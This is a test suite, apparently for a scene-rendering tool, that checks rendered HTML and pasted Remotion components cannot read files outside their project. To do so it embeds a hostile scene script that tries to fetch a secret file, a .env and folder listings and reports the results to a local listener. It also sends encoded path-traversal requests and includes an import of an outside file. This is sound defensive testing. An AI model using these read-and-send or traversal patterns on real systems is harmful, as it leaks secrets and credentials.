// Rendered scenes run their own scripts in Chrome from file://. They may read their own folder and project (fonts,
// GSAP, data files) but nothing else on disk: no keys or .env, no folder listings, no other projects or uploads.
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import http from "node:http";
import { spawn } from "node:child_process";
import { pathToFileURL } from "node:url";
import { fileAllowed, fileRoots, projectRoot, launch, openPage } from "../src/render.ts";
import { compareHtml } from "../src/pipeline.ts";
import { ASSET_FONT_DIR } from "../src/fonts.ts";

const ROOT = path.resolve(import.meta.dirname, "..");
const FONT = fs.readdirSync(ASSET_FONT_DIR).find((f) => f.endsWith(".ttf"))!;

/** A temp tree: outside/secret.txt, and project/ with package.json, .env and scenes/ (font, script, data file). */
function tree() {
  const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "hz-iso-")));
  const put = (rel: string, s: string | Buffer) => { fs.mkdirSync(path.dirname(path.join(base, rel)), { recursive: true }); fs.writeFileSync(path.join(base, rel), s); };
  put("outside/secret.txt", "OUTSIDE-SECRET");
  put("project/package.json", "{}");
  put("project/.env", "TOKEN=PROJECT-SECRET");
  put("project/scenes/f.ttf", fs.readFileSync(path.join(ASSET_FONT_DIR, FONT)));
  put("project/scenes/lib.js", "window.LIB = 'ok';");
  put("project/scenes/data.json", JSON.stringify({ ok: "same-folder" }));
  return { base, project: path.join(base, "project"), scenes: path.join(base, "project", "scenes"), secret: path.join(base, "outside", "secret.txt"), put };
}

/** A scene that tries to read files and reports what it got to `report` (a local HTTP listener). */
function hostileScene(report: string, t: { base: string; secret: string; project: string }) {
  const u = (p: string) => JSON.stringify(pathToFileURL(p).href);
  return `<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8">
<style>@font-face{font-family:T;src:url(f.ttf)} h1{font-family:T,serif;font-size:64px}</style>
<script src="lib.js"></script></head><body><h1>سلام عليكم</h1>
<iframe src=${u(t.secret)}></iframe>
<script>
const R = (k, v) => fetch(${JSON.stringify(report)} + "?" + k + "=" + encodeURIComponent(v), { mode: "no-cors" }).catch(() => {});
const tryRead = (name, url) => fetch(url).then((r) => r.text()).then((x) => R("read:" + name, x.slice(0, 120)), () => R("refused", name));
tryRead("secret", ${u(t.secret)});
tryRead("dotenv", ${u(path.join(t.project, ".env"))});
tryRead("listing", ${u(t.base + path.sep)});
tryRead("tmp", ${u(os.tmpdir() + path.sep)});
fetch("data.json").then((r) => r.json()).then((j) => R("same", j.ok), () => R("refused", "same"));
R("lib", typeof window.LIB === "string" ? window.LIB : "missing");
document.fonts.ready.then(() => R("font", document.fonts.check("64px T") ? "loaded" : "missing"));
</script></body></html>`;
}

/** Collects ?key=value reports from scenes. */
async function reporter() {
  const got: [string, string][] = [];
  const srv = http.createServer((req, res) => {
    for (const [k, v] of new URL(req.url || "/", "http://x").searchParams) got.push([k, v]);
    res.writeHead(204, { "access-control-allow-origin": "*" }); res.end();
  });
  await new Promise<void>((r) => srv.listen(0, "127.0.0.1", r));
  const url = `http://127.0.0.1:${(srv.address() as { port: number }).port}/r`;
  const wait = async (n: number, ms = 8000) => { const t0 = Date.now(); while (got.length < n && Date.now() - t0 < ms) await new Promise((r) => setTimeout(r, 50)); };
  return { url, got, wait, close: () => new Promise<void>((r) => srv.close(() => r())) };
}

const leaks = (got: [string, string][]) => got.filter(([k]) => k.startsWith("read:"));
const refusedNames = (got: [string, string][]) => new Set(got.filter(([k]) => k === "refused").map(([, v]) => v));

test("render isolation: fileAllowed keeps scenes inside their roots, away from hidden files, folders and escaping symlinks", () => {
  const t = tree();
  try {
    const roots = fileRoots([t.project]);
    assert.equal(fileAllowed(path.join(t.scenes, "f.ttf"), roots), true, "a file of the project");
    assert.equal(fileAllowed(path.join(ASSET_FONT_DIR, FONT), roots), true, "Harakah's own fonts");
    assert.equal(fileAllowed(path.join(t.scenes, "missing.png"), roots), true, "a missing file inside (nothing to read)");
    assert.equal(fileAllowed(t.secret, roots), false, "a file outside the project");
    assert.equal(fileAllowed(path.join(t.scenes, "..", "..", "outside", "secret.txt"), roots), false, "../ out of the project");
    assert.equal(fileAllowed(path.join(t.project, ".env"), roots), false, ".env");
    t.put("project/.git/config", "[remote]");
    assert.equal(fileAllowed(path.join(t.project, ".git", "config"), roots), false, ".git");
    assert.equal(fileAllowed(t.scenes, roots), false, "a folder (Chrome would list it)");
    t.put("project/node_modules/.pnpm/gsap@3/node_modules/gsap/dist/gsap.js", "");
    assert.equal(fileAllowed(path.join(t.project, "node_modules/.pnpm/gsap@3/node_modules/gsap/dist/gsap.js"), roots), true, "pnpm's store");
    if (process.platform !== "win32") {
      fs.symlinkSync(t.secret, path.join(t.scenes, "innocent.txt"));
      assert.equal(fileAllowed(path.join(t.scenes, "innocent.txt"), roots), false, "a symlink that leads out of the project");
      fs.symlinkSync(path.join(t.project, ".env"), path.join(t.scenes, "env.txt"));
      assert.equal(fileAllowed(path.join(t.scenes, "env.txt"), roots), false, "a symlink to a hidden file");
    }
    assert.equal(projectRoot(t.scenes), t.project, "the nearest folder with package.json");
    assert.equal(projectRoot(path.join(t.base, "outside")), path.join(t.base, "outside"), "no project: the folder itself");
    assert.notEqual(projectRoot(os.homedir()), path.parse(os.homedir()).root, "never above the home folder");
  } finally { fs.rmSync(t.base, { recursive: true, force: true }); }
});

test("render isolation: packages Node would resolve stay readable (hoisted monorepo, npm link), nothing else above the project", () => {
  const t = tree();
  try {
    // mono/ (workspace root) hoists gsap; the scene's project is mono/packages/app
    t.put("mono/package.json", "{}");
    t.put("mono/secrets.txt", "WORKSPACE-SECRET");
    t.put("mono/node_modules/gsap/dist/gsap.min.js", "");
    t.put("mono/node_modules/.cache/token", "CACHE-SECRET");
    t.put("mono/packages/app/package.json", "{}");
    t.put("mono/packages/app/scenes/scene.html", "");
    const scenes = path.join(t.base, "mono/packages/app/scenes");
    assert.equal(projectRoot(scenes), path.join(t.base, "mono/packages/app"));
    const roots = fileRoots([scenes, projectRoot(scenes)]);
    assert.equal(fileAllowed(path.join(t.base, "mono/node_modules/gsap/dist/gsap.min.js"), roots), true, "../../node_modules/gsap from a workspace package");
    assert.equal(fileAllowed(path.join(t.base, "mono/node_modules/.cache/token"), roots), false, "hidden folders in node_modules");
    assert.equal(fileAllowed(path.join(t.base, "mono/node_modules/gsap"), roots), false, "a package folder (listing)");
    assert.equal(fileAllowed(path.join(t.base, "mono/secrets.txt"), roots), false, "other files of the workspace root");
    assert.equal(fileAllowed(path.join(t.base, "outside/node_modules/x.js"), roots), false, "a node_modules Node wouldn't resolve from here");
    if (process.platform !== "win32") {
      // npm link / workspaces: the package is a symlink to a folder elsewhere
      t.put("linked-src/dist/lib.js", "");
      fs.symlinkSync(path.join(t.base, "linked-src"), path.join(t.base, "mono/packages/app/node_modules-tmp"), "dir");
      fs.mkdirSync(path.join(t.base, "mono/packages/app/node_modules"), { recursive: true });
      fs.renameSync(path.join(t.base, "mono/packages/app/node_modules-tmp"), path.join(t.base, "mono/packages/app/node_modules/linked"));
      assert.equal(fileAllowed(path.join(t.base, "mono/packages/app/node_modules/linked/dist/lib.js"), roots), true, "a linked package");
      assert.equal(fileAllowed(path.join(t.base, "linked-src/dist/lib.js"), roots), false, "the link's target by its own path");
    }
  } finally { fs.rmSync(t.base, { recursive: true, force: true }); }
});

test("render isolation: a scene loads its own font, script and data file, but no other file, folder or iframe", { timeout: 60_000 }, async () => {
  const t = tree();
  const rep = await reporter();
  const scene = path.join(t.scenes, "scene.html");
  fs.writeFileSync(scene, hostileScene(rep.url, t));
  const browser = await launch();
  try {
    const page = await openPage(browser, scene, { width: 800, height: 400 });
    await rep.wait(7);
    assert.deepEqual(leaks(rep.got), [], "a scene read a file it should not");
    assert.deepEqual(refusedNames(rep.got), new Set(["secret", "dotenv", "listing", "tmp"]));
    const ok = Object.fromEntries(rep.got.filter(([k]) => ["same", "lib", "font"].includes(k)));
    assert.deepEqual(ok, { same: "same-folder", lib: "ok", font: "loaded" }, "the scene's own files still load");
    // the iframe never shows the secret, so it can't end up in a screenshot either
    const frame = page.frames().find((f) => f !== page.mainFrame());
    const text = frame ? await frame.evaluate(() => document.body?.innerText ?? "").catch(() => "") : "";
    assert.doesNotMatch(text, /OUTSIDE-SECRET/);
  } finally { await browser.close(); await rep.close(); fs.rmSync(t.base, { recursive: true, force: true }); }
});

test("render isolation: compare (CLI and MCP pipeline) gives the panels the output folder and the scene's project only", { timeout: 120_000 }, async () => {
  const t = tree();
  const rep = await reporter();
  try {
    const r = await compareHtml(hostileScene(rep.url, t), path.join(t.base, "out"), {}, { layout: false }, t.scenes);
    assert.ok(fs.existsSync(r.comparePng));
    await rep.wait(14); // before + after panels
    assert.deepEqual(leaks(rep.got), []);
    assert.deepEqual(refusedNames(rep.got), new Set(["secret", "dotenv", "listing", "tmp"]));
    assert.ok(rep.got.some(([k, v]) => k === "same" && v === "same-folder"), "relative files resolve through <base> into the project");
  } finally { await rep.close(); fs.rmSync(t.base, { recursive: true, force: true }); }
});

test("render isolation: a paste in the web tool can't read the disk or other uploads in the temp folder", { timeout: 120_000 }, async () => {
  const t = tree();
  const rep = await reporter();
  const child = spawn(process.execPath, ["dist/server.js"], { cwd: ROOT, env: { ...process.env, PORT: "0", HOST: "127.0.0.1" }, stdio: ["ignore", "pipe", "pipe"] });
  try {
    const port = await new Promise<number>((resolve, reject) => {
      let out = "";
      child.stdout.on("data", (d) => { out += d; const m = /127\.0\.0\.1:(\d+)/.exec(out); if (m) resolve(Number(m[1])); });
      child.on("exit", (c) => reject(new Error("server exited " + c + out)));
    });
    // another "upload" sitting in the temp folder, like a second user's project
    const other = fs.mkdtempSync(path.join(os.tmpdir(), "harakah-ui-other-"));
    fs.writeFileSync(path.join(other, "client.txt"), "OTHER-UPLOAD");
    try {
      const html = hostileScene(rep.url, { ...t, secret: path.join(other, "client.txt") });
      const res = await fetch(`http://127.0.0.1:${port}/api/compare`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ html, kind: "html" }) });
      assert.equal(res.status, 200, await res.clone().text());
      await rep.wait(14);
      assert.deepEqual(leaks(rep.got), []);
      assert.ok(refusedNames(rep.got).has("secret") && refusedNames(rep.got).has("tmp"), "the other upload and the temp folder listing are refused");
    } finally { fs.rmSync(other, { recursive: true, force: true }); }
  } finally { child.kill(); await rep.close(); fs.rmSync(t.base, { recursive: true, force: true }); }
});

test("render isolation: a pasted Remotion component can't import a local file into its bundle", { timeout: 300_000 }, async () => {
  const { scaffold, loadRemotion, entryPoint, confineImports, FALLBACK_MODULES } = await import("../src/remotion/compare.ts");
  const t = tree();
  t.put("outside/secret.json", JSON.stringify({ marker: "OUTSIDE-JSON" }));
  const bundleOf = async (name: string, code: string) => {
    t.put(`paste-${name}/Composition.tsx`, code);
    const s = scaffold(path.join(t.base, `paste-${name}`, "Composition.tsx"), path.join(t.base, `proj-${name}`), { outDir: t.base } as any);
    const { bundle } = await loadRemotion(s.root);
    return bundle({ entryPoint: entryPoint(s.root), enableCaching: false, outDir: path.join(t.base, `bundle-${name}`), webpackOverride: confineImports([s.root, FALLBACK_MODULES]) }) as Promise<string>;
  };
  try {
    await assert.rejects(bundleOf("evil", `import React from "react";\nimport secret from ${JSON.stringify(path.join(t.base, "outside", "secret.json"))};\nexport const Title: React.FC = () => <h1 dir="rtl">مرحبا {JSON.stringify(secret)}</h1>;\n`),
      /secret\.json|Module not found|Can't resolve/, "an import from outside the paste was bundled");
    assert.equal(fs.readdirSync(t.base).filter((f) => f.startsWith("bundle-evil")).some((d) => fs.readdirSync(path.join(t.base, d)).some((f) => /\.js$/.test(f) && fs.readFileSync(path.join(t.base, d, f), "utf8").includes("OUTSIDE-JSON"))), false);
    // the confinement still lets an ordinary composition bundle: remotion, react, its own sibling files
    t.put("paste-ok/strings.ts", `export const TITLE = "قصص تستحق أن تُروى";\n`);
    const ok = await bundleOf("ok", `import React from "react";\nimport { AbsoluteFill, useCurrentFrame } from "remotion";\nimport { TITLE } from "./strings";\nexport const Title: React.FC = () => { useCurrentFrame(); return <AbsoluteFill><h1 dir="rtl" lang="ar">{TITLE}</h1></AbsoluteFill>; };\n`);
    assert.ok(fs.existsSync(path.join(ok, "index.html")));
  } finally { fs.rmSync(t.base, { recursive: true, force: true }); }
});

test("render isolation: the Remotion audit's bundle server serves its own folder, not a sibling with the same prefix", { timeout: 30_000 }, async () => {
  const { serveDir } = await import("../src/remotion/layout.ts");
  const t = tree();
  t.put("work/bundle/index.html", "<!doctype html><p>bundle</p>");
  t.put("work/bundle-other/secret.txt", "SIBLING-SECRET");
  const srv = await serveDir(path.join(t.base, "work", "bundle"));
  const get = (p: string) => new Promise<{ status: number; body: string }>((resolve, reject) => {
    const u = new URL(srv.url);
    http.get({ host: u.hostname, port: u.port, path: p }, (res) => { let b = ""; res.on("data", (d) => (b += d)); res.on("end", () => resolve({ status: res.statusCode!, body: b })); }).on("error", reject);
  });
  try {
    assert.equal((await get("/")).status, 200);
    for (const p of ["/..%2Fbundle-other%2Fsecret.txt", "/%2E%2E%2Fbundle-other%2Fsecret.txt", "/..%2F..%2Foutside%2Fsecret.txt"]) {
      const r = await get(p);
      assert.equal(r.status, 404, p);
      assert.doesNotMatch(r.body, /SECRET/);
    }
  } finally { await srv.close(); fs.rmSync(t.base, { recursive: true, force: true }); }
});
